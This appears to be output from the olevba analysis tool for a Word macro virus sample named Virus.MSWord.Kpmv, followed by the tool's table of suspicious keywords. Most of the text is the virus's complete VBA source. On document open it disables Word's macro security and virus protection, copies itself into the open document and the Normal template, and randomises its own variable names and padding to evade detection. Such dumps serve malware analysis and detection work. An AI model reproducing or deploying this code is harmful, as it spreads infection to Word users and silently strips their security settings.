olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Classe1.cls 
in file: Virus.MSWord.Kpmv - OLE stream: 'Macros/VBA/Classe1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next

Dim ci73r7(27) As String: ci73r7(0) = "pz08x6": ci73r7(1) = "em32f0": ci73r7(2) = "em71a0": ci73r7(3) = "rc78s4": ci73r7(4) = "eh99f9": ci73r7(5) = "ed26f8": ci73r7(6) = "rc78s4": ci73r7(7) = "rt51q4": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

ci73r7(8) = "ke77v5": ci73r7(9) = "eo06y8": ci73r7(10) = "vk24i1": ci73r7(11) = "tr58e2": ci73r7(12) = "ve43n1": ci73r7(13) = "rx69m3": ci73r7(14) = "cl47o8": ci73r7(15) = "oh00r3": Options.VirusProtection = False

ci73r7(16) = "lz48l4": ci73r7(17) = "px81e2": ci73r7(18) = "kc32b4": ci73r7(19) = "xq21t8": ci73r7(20) = "gs36v6": ci73r7(21) = "rb07u2": ci73r7(22) = "ci73r7": ci73r7(23) = "cj21t6": Options.SaveNormalPrompt = False

ci73r7(24) = "vq90j8": ci73r7(25) = "jj35u3": ci73r7(26) = "zn24h7": ci73r7(27) = "lr52v2": Options.ConfirmConversions = False

Set pz08x6 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule

Set em32f0 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule

Set em71a0 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule

eh99f9 = "private sub" & " document_open()": ed26f8 = "end" & " sub"

rc78s4 = em71a0.Lines(1, em71a0.CountOfLines)

rt51q4 = InStr(LCase(rc78s4), eh99f9)

ke77v5 = InStr(rt51q4, LCase(rc78s4), ed26f8) + Len(ed26f8)

eo06y8 = Mid(rc78s4, rt51q4, ke77v5 - rt51q4)

If pz08x6.CountOfLines <> 0 Then

vk24i1 = pz08x6.Lines(1, pz08x6.CountOfLines)

If InStr(vk24i1, "(27) As String") = 0 Then

If InStr(LCase(vk24i1), eh99f9) <> 0 Then

tr58e2 = False

For ve43n1 = 1 To pz08x6.CountOfLines: DoEvents

If tr58e2 = False Then

If LCase(pz08x6.Lines(ve43n1, 1)) = eh99f9 Then

tr58e2 = True

rx69m3 = ve43n1

End If

Else

If LCase(pz08x6.Lines(ve43n1, 1)) = ed26f8 Then

cl47o8 = ve43n1

Exit For

End If

End If

Next

pz08x6.DeleteLines rx69m3, cl47o8 - (rx69m3 - 1)

End If

Set oh00r3 = pz08x6

pz08x6.addfromstring eo06y8: If ActiveDocument.Saved = False Then ActiveDocument.Save

End If

Else

Set oh00r3 = pz08x6

pz08x6.addfromstring eo06y8: If ActiveDocument.Saved = False Then ActiveDocument.Save

End If

If em32f0.CountOfLines <> 0 Then

lz48l4 = em32f0.Lines(1, em32f0.CountOfLines)

If InStr(lz48l4, "(27) As String") = 0 Then

If InStr(LCase(lz48l4), eh99f9) <> 0 Then

tr58e2 = False

For ve43n1 = 1 To em32f0.CountOfLines: DoEvents

If tr58e2 = False Then

If LCase(em32f0.Lines(ve43n1, 1)) = eh99f9 Then

tr58e2 = True

rx69m3 = ve43n1

End If

Else

If LCase(em32f0.Lines(ve43n1, 1)) = ed26f8 Then

cl47o8 = ve43n1

Exit For

End If

End If

Next

em32f0.DeleteLines rx69m3, cl47o8 - (rx69m3 - 1)

End If

Set oh00r3 = em32f0

em32f0.addfromstring eo06y8: If NormalTemplate.Saved = False Then NormalTemplate.Save

End If

Else

Set oh00r3 = em32f0

em32f0.addfromstring eo06y8: If NormalTemplate.Saved = False Then NormalTemplate.Save

End If

If oh00r3 <> "" Then

Dim px81e2 As Long, kc32b4 As Long, xq21t8 As Long, gs36v6 As Long

For rb07u2 = 0 To UBound(ci73r7): DoEvents

Randomize: cj21t6 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents

px81e2 = 1: kc32b4 = 1

With oh00r3

Do While .Find(ci73r7(rb07u2), px81e2, kc32b4, xq21t8, gs36v6, True)

vq90j8 = .Lines(xq21t8, 1)

jj35u3 = Mid(vq90j8, 1, kc32b4 - 1) & cj21t6 & Mid(vq90j8, gs36v6)

.replaceline xq21t8, jj35u3: DoEvents

px81e2 = xq21t8

xq21t8 = .CountOfLines: kc32b4 = 1

Loop

End With

Next

With oh00r3

For zn24h7 = 2 To (.CountOfLines - 1) Step 2: DoEvents

For lr52v2 = 1 To (Int(Rnd * 10) + 2): DoEvents

Randomize: cj21t6 = cj21t6 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents

Next lr52v2

Randomize: .replaceline zn24h7, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & cj21t6 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents

cj21t6 = "": DoEvents

Next zn24h7

End With

End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

